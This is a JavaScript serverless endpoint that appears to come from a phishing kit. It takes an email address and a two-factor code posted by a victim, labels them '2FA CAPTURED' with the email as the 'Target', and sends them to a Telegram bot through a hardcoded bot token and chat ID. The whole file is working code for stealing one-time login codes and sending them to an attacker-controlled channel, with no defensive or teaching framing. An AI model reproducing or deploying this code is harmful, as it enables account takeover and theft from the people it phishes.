// api/2fa.js
module.exports = async (req, res) => {
    if(req.method === 'POST'){
        const {email, code} = req.body;
        
        const botToken = "8288645874:AAHXwc49sz8HwK7_JGIBUWEiYGpZJEbg5kQ";
        const chatId = "8288645874";
        
        const message = `🔐 **2FA CAPTURED**\n\n📧 Target: ${email}\n🔢 Code: ${code}`;
        
        try{
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
            
            console.log(`2FA captured for: ${email}`);
            return res.status(200).json({success: true});
        } catch(error){
            console.error(error);
            return res.status(500).json({error: 'Failed'});
        }
    }
    
    return res.status(405).json({error: 'Method not allowed'});
};
